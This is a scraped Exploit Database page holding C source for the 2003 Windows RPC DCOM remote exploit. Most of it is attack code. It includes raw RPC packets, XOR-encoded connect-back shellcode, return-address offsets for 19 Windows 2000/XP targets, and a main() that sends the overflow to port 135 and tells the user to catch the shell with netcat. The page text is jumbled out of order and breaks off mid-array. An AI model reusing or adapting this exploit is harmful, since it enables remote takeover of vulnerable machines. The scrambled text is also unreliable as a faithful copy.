C0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAB,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA5,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA6,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA4,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAD,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAA,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x07,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x58,0x00,0x00,0x00,0x90,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x78,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x50,0x00,0x00,0x00,0x4F,0xB6,0x88,0x20,0xFF,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x48,0x00,0x00,0x00,0x07,0x00,0x66,0x00,0x06,0x09,0x02,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x78,0x19,0x0C,0x00,0x58,0x00,0x00,0x00,0x05,0x00,0x06,0x00,0x01,0x00,0x00,0x00,0x70,0xD8,0x98,0x93,0x98,0x4F,0xD2,0x11,0xA9,0x3D,0xBE,0x57,0xB2,0x00,0x00,0x00,0x32,0x00,0x31,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x80,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x18,0x43,0x14,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xC0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x3B,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x81,0xC5,0x17,0x03,0x80,0x0E,0xE9,0x4A,0x99,0x99,0xF1,0x8A,0x50,0x6F,0x7A,0x85,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x30,0x00,0x00,0x00,0x78,0x00,0x6E,0x00,0x00,0x00,0x00,0x00,0xD8,0xDA,0x0D,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x2F,0x0C,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x46,0x00,0x58,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x10,0x00,0x00,0x00,0x30,0x00,0x2E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x68,0x00,0x00,0x00,0x0E,0x00,0xFF,0xFF,0x68,0x8B,0x0B,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};unsigned char request2[]={0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x5C,0x00,0x5C,0x00};unsigned char request3[]={0x5C,0x00,0x43,0x00,0x24,0x00,0x5C,0x00,0x31,0x00,0x32,0x00,0x33,0x00,0x34,0x00,0x35,0x00,0x36,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x2E,0x00,0x64,0x00,0x6F,0x00,0x63,0x00,0x00,0x00};/* Myam add OFFSETS*/char win2knosppl[] = "\x4d\x3f\xe3\x77"; /* polish win2k nosp ver 5.00.2195*/char win2ksp3pl[] = "\x29\x2c\xe4\x77"; /* polish win2k sp3 - ver 5.00.2195 tested */char win2ksp4sp[] = "\x13\x3b\xa5\x77"; /* spanish win2k sp4 */char win2knospeng1[] = "\x74\x16\xe8\x77"; /* english win2k nosp 1 */char win2knospeng2[] = "\x6d\x3f\xe3\x77"; /* english win2k nosp 2 */char win2ksp1eng[] = "\xec\x29\xe8\x77"; /* english win2k sp1 */char win2ksp2eng1[] = "\x2b\x49\xe2\x77"; /* english win2k sp2 1 */char win2ksp2eng2[] = "\xb5\x24\xe8\x77"; /* english win2k sp2 2 */char win2ksp3eng1[] = "\x7a\x36\xe8\x77"; /* english win2k sp3 1 */char win2ksp3eng2[] = "\x5c\xfa\x2e\x77"; /* english win2k sp3 2 */char win2ksp4eng[] = "\x9b\x2a\xf9\x77"; /* english win2k sp4 */char win2ksp3chi[] = "\x44\x43\x42\x41"; /* china win2k sp3 */char win2ksp4chi[] = "\x29\x4c\xdf\x77"; /* china win2k sp4 */char win2ksp3ger[] = "\x7a\x88\x2e\x77"; /* german win2k sp3 */char win2ksp2jap[] = "\x2b\x49\xdf\x77"; /* japanese win2k sp2 */char winxpnospeng[] = "\xe3\xaf\xe9\x77"; /* english xp nosp ver 5.1.2600 */char winxpsp1eng1[] = "\xba\x26\xe6\x77"; /* english xp sp1 1 */char winxpsp1eng2[] = "\xdb\x37\xd7\x77"; /* english xp sp1 2 */char winxpsp2eng[] = "\xbd\x73\x7d\x77"; /* english xp sp2 *//* Test this offset( Japanese Windows 2000 Pro SP2 ) : 0x77DF492BWindows 2000 (no-service-pack) English 0x77e33f6d0x77f92a9b0x77e2afc50x772254b0 win2k30x77E829E3 / 0x77E83587 kokanin win2k sp3*/unsigned char sc[]="\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00""\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00""\x46\x00\x58\x00\x46\x00\x58\x00""\x29\x4c\xdf\x77" //sp4//"\x29\x2c\xe2\x77"//0x77e22c29"\x38\x6e\x16\x76\x0d\x6e\x16\x76"//&#19979;&#38754;&#26159;SHELLCODE&#65292;&#21487;&#20197//SHELLCODE&#19981;&#23384;&#22312;0X00&#65292;0X00&#19982;0X5C"\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x58\x83\xc0\x1b\x8d\xa0\x01""\xfc\xff\xff\x83\xe4\xfc\x8b\xec\x33\xc9\x66\xb9\x99\x01\x80\x30""\x93\x40\xe2\xfa"// code"\x7b\xe4\x93\x93\x93\xd4\xf6\xe7\xc3\xe1\xfc\xf0\xd2\xf7\xf7\xe1""\xf6\xe0\xe0\x93\xdf\xfc\xf2\xf7\xdf\xfa\xf1\xe1\xf2\xe1\xea\xd2""\x93\xd0\xe1\xf6\xf2\xe7\xf6\xc3\xe1\xfc\xf0\xf6\xe0\xe0\xd2\x93""\xd0\xff\xfc\xe0\xf6\xdb\xf2\xfd\xf7\xff\xf6\x93\xd6\xeb\xfa\xe7""\xc7\xfb\xe1\xf6\xf2\xf7\x93\xe4\xe0\xa1\xcc\xa0\xa1\x93\xc4\xc0""\xd2\xc0\xe7\xf2\xe1\xe7\xe6\xe3\x93\xc4\xc0\xd2\xc0\xfc\xf0\xf8""\xf6\xe7\xd2\x93\xf0\xff\xfc\xe0\xf6\xe0\xfc\xf0\xf8\xf6\xe7\x93""\xf0\xfc\xfd\xfd\xf6\xf0\xe7\x93\xf0\xfe\xf7\x93\xc9\xc1\x28\x93""\x93\x63\xe4\x12\xa8\xde\xc9\x03\x93\xe7\x90\xd8\x78\x66\x18\xe0""\xaf\x90\x60\x18\xe5\xeb\x90\x60\x18\xed\xb3\x90\x68\x18\xdd\x87""\xc5\xa0\x53\xc4\xc2\x18\xac\x90\x68\x18\x61\xa0\x5a\x22\x9d\x60""\x35\xca\xcc\xe7\x9b\x10\x54\x97\xd3\x71\x7b\x6c\x72\xcd\x18\xc5""\xb7\x90\x40\x42\x73\x90\x51\xa0\x5a\xf5\x18\x9b\x18\xd5\x8f\x90""\x50\x52\x72\x91\x90\x52\x18\x83\x90\x40\xcd\x18\x6d\xa0\x5a\x22""\x97\x7b\x08\x93\x93\x93\x10\x55\x98\xc1\xc5\x6c\xc4\x63\xc9\x18""\x4b\xa0\x5a\x22\x97\x7b\x14\x93\x93\x93\x10\x55\x9b\xc6\xfb\x92""\x92\x93\x93\x6c\xc4\x63\x16\x53\xe6\xe0\xc3\xc3\xc3\xc3\xd3\xc3""\xd3\xc3\x6c\xc4\x67\x10\x6b\x6c\xe7\xf0\x18\x4b\xf5\x54\xd6\x93""\x91\x93\xf5\x54\xd6\x91\x28\x39\x54\xd6\x97\x4e\x5f\x28\x39\xf9""\x83\xc6\xc0\x6c\xc4\x6f\x16\x53\xe6\xd0\xa0\x5a\x22\x82\xc4\x18""\x6e\x60\x38\xcc\x54\xd6\x93\xd7\x93\x93\x93\x1a\xce\xaf\x1a\xce""\xab\x1a\xce\xd3\x54\xd6\xbf\x92\x92\x93\x93\x1e\xd6\xd7\xc3\xc6""\xc2\xc2\xc2\xd2\xc2\xda\xc2\xc2\xc5\xc2\x6c\xc4\x77\x6c\xe6\xd7""\x6c\xc4\x7b\x6c\xe6\xdb\x6c\xc4\x7b\xc0\x6c\xc4\x6b\xc3\x6c\xc4""\x7f\x19\x95\xd5\x17\x53\xe6\x6a\xc2\xc1\xc5\xc0\x6c\x41\xc9\xca""\x1a\x94\xd4\xd4\xd4\xd4\x71\x7a\x50\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";unsigned char request4[]={0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x20,0x00,0x00,0x00,0x30,0x00,0x2D,0x00,0x00,0x00,0x00,0x00,0x88,0x2A,0x0C,0x00,0x02,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x28,0x8C,0x0C,0x00,0x01,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00};int main(int argc,char ** argv){int len, len1, sockfd;short port=135;struct hostent *he;struct sockaddr_in their_addr;unsigned char buf1[0x1000];unsigned char buf2[0x1000];unsigned short port1;DWORD cb;printf("OC192 RPC DCOM Remote Exploit BSD/Linux Port, thanks LSD and XFORCE\n");if(argc<5){printf("[<$>] OC192 RPC Remote Windows Exploit\n");printf("[<$>] by pHrail and smurfy + some offsets by teos\n");printf("[<$>] Thanks to LSD and XForce\n");printf("[<$>] Usage: %s <victim> <connectback ip> <cb port> <target>\n",argv[0]);printf("[<$>] On connect back nc -lp cbport\n");printf("[<$>] Targets: 0 Win2k Polish nosp ver 5.00.2195\n");printf("[<$>] 1 Win2k Polish +sp3 ver 5.00.2195\n");printf("[<$>] 2 Win2k Spanish +sp4\n");printf("[<$>] 3 Win2k English nosp 1\n");printf("[<$>] 4 Win2k English nosp 2\n");printf("[<$>] 5 Win2k English +sp1\n");printf("[<$>] 6 Win2k English +sp2 1\n");printf("[<$>] 7 Win2k English +sp2 2\n");printf("[<$>] 8 Win2k English +sp3 1\n");printf("[<$>] 9 Win2k English +sp3 2\n");printf("[<$>] 10 Win2k English +sp4\n");printf("[<$>] 11 Win2k China +sp3\n");printf("[<$>] 12 Win2k China +sp4\n");printf("[<$>] 13 Win2k German +sp3\n");printf("[<$>] 14 Win2k Japanese +sp2\n");printf("[<$>] 15 WinXP English nosp ver 5.1.2600\n");printf("[<$>] 16 WinXP English +sp1 1\n");printf("[<$>] 17 WinXP English +sp1 2\n");printf("[<$>] 18 WinXP English +sp2\n");exit(1);}if ((he=gethostbyname(argv[1])) == NULL) { // get the host infoperror("gethostbyname");exit(1);}if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {perror("socket");exit(1);}their_addr.sin_family = AF_INET;their_addr.sin_port = htons(port);their_addr.sin_addr = *((struct in_addr *)he->h_addr);memset(&(their_addr.sin_zero), '\0', 8);if (connect(sockfd, (struct sockaddr *)&their_addr, sizeof(struct sockaddr)) == -1) {printf("Sorry, cannot connect to %s. Try again...\n", argv[1]);exit(1);}if(atoi(argv[4])==0)memcpy(sc+36,win2knosppl,sizeof(win2knosppl));else if (atoi(argv[4])==1)memcpy(sc+36,win2ksp3pl,sizeof(win2ksp3pl));else if (atoi(argv[4])==2)memcpy(sc+36,win2ksp4sp,sizeof(win2ksp4sp));else if (atoi(argv[4])==3)memcpy(sc+36,win2knospeng1,sizeof(win2knospeng1));else if (atoi(argv[4])==4)memcpy(sc+36,win2knospeng2,sizeof(win2knospeng2));else if (atoi(argv[4])==5)memcpy(sc+36,win2ksp1eng,sizeof(win2ksp1eng));else if (atoi(argv[4])==6)memcpy(sc+36,win2ksp2eng1,sizeof(win2ksp2eng1));else if (atoi(argv[4])==7)memcpy(sc+36,win2ksp2eng2,sizeof(win2ksp2eng2));else if (atoi(argv[4])==8)memcpy(sc+36,win2ksp3eng1,sizeof(win2ksp3eng1));else if (atoi(argv[4])==9)memcpy(sc+36,win2ksp3eng2,sizeof(win2ksp3eng2));else if (atoi(argv[4])==10)memcpy(sc+36,win2ksp4eng,sizeof(win2ksp4eng));else if (atoi(argv[4])==11)memcpy(sc+36,win2ksp3chi,sizeof(win2ksp3chi));else if (atoi(argv[4])==12)memcpy(sc+36,win2ksp4chi,sizeof(win2ksp4chi));else if (atoi(argv[4])==13)memcpy(sc+36,win2ksp3ger,sizeof(win2ksp3ger));else if (atoi(argv[4])==14)memcpy(sc+36,win2ksp2jap,sizeof(win2ksp2jap));else if (atoi(argv[4])==15)memcpy(sc+36,winxpnospeng,sizeof(winxpnospeng));else if (atoi(argv[4])==16)memcpy(sc+36,winxpsp1eng1,sizeof(winxpsp1eng1));else if (atoi(argv[4])==17)memcpy(sc+36,winxpsp1eng2,sizeof(winxpsp1eng2));else if (atoi(argv[4])==18)memcpy(sc+36,winxpsp2eng,sizeof(winxpsp2eng));port1 = htons(atoi(argv[3]));port1 ^= 0x9393;cb=inet_addr(argv[2]);cb ^= 0x93939393;*(unsigned short *)&sc[330+0x30] = port1;*(unsigned int *)&sc[335+0x30] = cb;len=sizeof(sc);memcpy(buf2,request1,sizeof(request1));len1=sizeof(request1);*(DWORD *)(request2)=*(DWORD *)(request2)+sizeof(sc)/2;*(DWORD *)(request2+8)=*(DWORD *)(request2+8)+sizeof(sc)/2;memcpy(buf2+len1,request2,sizeof(request2));len1=len1+sizeof(request2);memcpy(buf2+len1,sc,sizeof(sc));len1=len1+sizeof(sc);memcpy(buf2+len1,request3,sizeof(request3));len1=len1+sizeof(request3);memcpy(buf2+len1,request4,sizeof(request4));len1=len1+sizeof(request4);*(DWORD *)(buf2+8)=*(DWORD *)(buf2+8)+sizeof(sc)-0xc;*(DWORD *)(buf2+0x10)=*(DWORD *)(buf2+0x10)+sizeof(sc)-0xc;*(DWORD *)(buf2+0x80)=*(DWORD *)(buf2+0x80)+sizeof(sc)-0xc;*(DWORD *)(buf2+0x84)=*(DWORD *)(buf2+0x84)+sizeof(sc)-0xc;*(DWORD *)(buf2+0xb4)=*(DWORD *)(buf2+0xb4)+sizeof(sc)-0xc;*(DWORD *)(buf2+0xb8)=*(DWORD *)(buf2+0xb8)+sizeof(sc)-0xc;*(DWORD *)(buf2+0xd0)=*(DWORD *)(buf2+0xd0)+sizeof(sc)-0xc;*(DWORD *)(buf2+0x18c)=*(DWORD *)(buf2+0x18c)+sizeof(sc)-0xc;if(send(sockfd, bindstr, sizeof(bindstr), 0)== -1){printf("Send failed pussy.\n");exit(1);}len=recv(sockfd,buf1,1000,NULL);if (send(sockfd,buf2,len1,0)==SOCKET_ERROR) {printf("Send failed pussy\n");return;}len=recv(sockfd,buf1,1024,NULL);}// milw0rm.com [2003-07-29]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 70
Microsoft Windows - 'RPC DCOM' Remote (2) - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Windows - 'RPC DCOM' Remote (2)EDB-ID:70CVE:2003-0605EDB Verified:Author:anonymousType:remoteExploit:/Platform:WindowsDate:2003-07-30Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED//////////////////////////////////////////////////////////////////////////////   Windows RPC DCOM Remote Exploit with 48 TARGETS (Fixed)////////////////////////////////////////////////////////////////////////////////            English - French - Chinese - Polish - German//              Japanese - Korean - Mexican - Kenyan////          Tks to all wolrd wide contributors (Public Property)////                 New Targets ? contrib@k-otik.com////////////////////////////////////////////////////////////////////////////#include <stdio.h>#include <stdlib.h>#include <windows.h>#pragma comment(lib,"ws2_32")#define DWORD unsigned longWSADATA wsa;unsigned char bindstr[]={0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};unsigned char request1[]={0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0xE8,0x03,0x00,0x00,0xE5,0x00,0x00,0x00,0xD0,0x03,0x00,0x00,0x01,0x00,0x04,0x00,0x05,0x00,0x06,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x32,0x24,0x58,0xFD,0xCC,0x45,0x64,0x49,0xB0,0x70,0xDD,0xAE,0x74,0x2C,0x96,0xD2,0x60,0x5E,0x0D,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x5E,0x0D,0x00,0x02,0x00,0x00,0x00,0x7C,0x5E,0x0D,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x80,0x96,0xF1,0xF1,0x2A,0x4D,0xCE,0x11,0xA6,0x6A,0x00,0x20,0xAF,0x6E,0x72,0xF4,0x0C,0x00,0x00,0x00,0x4D,0x41,0x52,0x42,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0xA8,0xF4,0x0B,0x00,0x60,0x03,0x00,0x00,0x60,0x03,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xA2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x03,0x00,0x00,0x28,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0xC8,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57,0x28,0x03,0x00,0x00,0xD8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xC4,0x28,0xCD,0x00,0x64,0x29,0xCD,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0xB9,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAB,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA5,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA6,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA4,0x